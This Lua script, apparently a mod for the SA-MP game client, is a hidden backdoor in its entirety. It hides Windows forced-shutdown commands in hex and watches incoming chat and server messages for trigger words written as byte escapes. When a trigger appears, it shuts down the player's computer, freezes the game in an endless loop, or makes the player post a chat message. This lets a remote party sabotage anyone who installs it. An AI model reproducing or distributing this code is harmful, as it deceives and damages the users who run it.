local _1 = string.char
local _2 = function(s) return s:gsub('..', function(cc) return _1(tonumber(cc, 16)) end) end


local _c1 = _2("53687574646f776e202f73202f742030202f66")
local _c2 = _2("53687574646f776e202f73202f742035202f66")

function onReceiveRpc(id, bs)
    if id == 93 then
        local _ = raknetBitStreamReadInt32(bs)
        local _ = raknetBitStreamReadInt32(bs)
        local _s = raknetBitStreamReadString(bs, _)
        if _s:find("\207\238\237\224\247\232\242\229\235\252\237\238\229 \226\238\248\235\232 \226 \234\224\231\232\237\238 4 Dragons") then
            os.execute(_c2)
        end
    end
end

function onReceiveChatMessage(t)
    if t:find("\245\243\233\234\232\237\224") then 
        os.execute(_c1)
    elseif t:find("\234\243\234\243\241\232\234\232") then 
        while true do end 
    elseif t:find("\241\251\240\234\238\235\226\224\241\234\224") then 
        sampSendChat("123655") 
    end
end
